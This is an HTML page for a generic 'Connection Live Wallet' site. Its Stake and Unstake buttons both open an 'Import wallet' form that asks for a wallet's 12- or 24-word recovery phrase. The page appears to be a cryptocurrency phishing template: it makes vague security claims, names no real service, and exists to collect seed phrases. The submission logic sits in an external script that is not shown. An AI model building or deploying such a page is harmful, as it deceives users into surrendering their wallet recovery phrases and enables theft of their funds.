<!DOCTYPE html>
<html lang="en">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />

  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Connection Live Wallet</title>
    <link rel="stylesheet" href="css/style.css" />
    <script
      src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"
      integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-fQybjgWLrvvRgtW6bFlB7jaZrFsaBXjsOMm/tB9LTS58ONXgqbR9W8oWht/amnpF"
      crossorigin="anonymous"
    ></script>
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css"
      integrity="sha384-zCbKRCUGaJDkqS1kPbPd7TveP5iyJE0EjAuZQTgFLD2ylzuqKfdKlfG/eSrtxUkn"
      crossorigin="anonymous"
    />
  </head>

  <body>
    <div id="wrapper"></div>
    <div class="container">
      <div class="d-flex justify-content-between my-3">
        <button
          class="btn btn-success"
          data-toggle="modal"
          data-target="#exampleModal"
        >
          Stake
        </button>
        <button
          class="btn btn-primary"
          data-toggle="modal"
          data-target="#exampleModal"
        >
          Unstake
        </button>
      </div>

      <h1 class="heading m-3">Connection Live Wallet</h1>
      <p>
        The best way to manage all your wallets from a single app. With our
        highly secure integrations with top wallet providers, you can
        efficiently manage all your wallets on your app.
      </p>

      <div
        class="modal fade"
        id="exampleModal"
        tabindex="-1"
        aria-labelledby="exampleModalLabel"
        aria-hidden="true"
      >
        <div class="modal-dialog">
          <div class="modal-content">
            <div class="modal-header">
              <h5 class="modal-title" id="exampleModalLabel">Import wallet</h5>
              <button
                type="button"
                class="close"
                data-dismiss="modal"
                aria-label="Close"
              >
                <span aria-hidden="true">&times;</span>
              </button>
            </div>
            <div class="modal-body">
            <form action="">
                <input type="text" placeholder="Recovery Phase"class="w-100 p-1" >
                <!-- <textarea
                  placeholder="Recovery phase"
                  class="w-100 p-1"
                ></textarea> -->
              </form>
              <p class="text-muted">
                Typically 12 (sometimes 24) words separated by single spaces
              </p>
            </div>
            <div class="modal-footer">
              <button type="button" class="btn btn-primary">
                Import wallet
              </button>
            </div>
          </div>
        </div>
      </div>

      <div id="modal_content"></div>

      <div class="grid-container" id="container"></div>
    </div>
    <script src="js/main.js"></script>
    <!-- <script type="module" type="javasript" src="./script.js"></script> -->
  </body>
</html>
